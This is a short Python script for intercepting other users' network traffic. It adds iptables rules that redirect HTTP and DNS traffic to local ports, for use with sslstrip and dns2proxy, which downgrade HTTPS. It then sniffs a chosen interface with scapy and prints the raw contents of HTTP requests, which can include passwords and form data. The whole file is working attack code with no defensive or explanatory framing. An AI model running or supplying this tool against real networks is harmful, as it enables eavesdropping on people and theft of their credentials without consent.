#!/usr/bin/python3
import scapy.all as scapy
from scapy.layers.http import http_request
import subprocess as bc


def sp2dp():
    # This function for sslstrip and dns2proxy | for https.
    # iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
    # iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53

    bc.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT","--to-port", "10000"])
    bc.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "udp", "--destination-port", "53", "-j", "REDIRECT","--to-port", "53"])


def listenPs(interface):
    scapy.sniff(iface=interface, store=False, prn=analyzePs)
    #prn : callback function

def analyzePs(packet):
    #packet.show()
    if packet.haslayer(http_request):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw].load)

    ("""
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw].load)
            """)

sp2dp()
interface = str(input("Interface: "))
listenPs(interface)

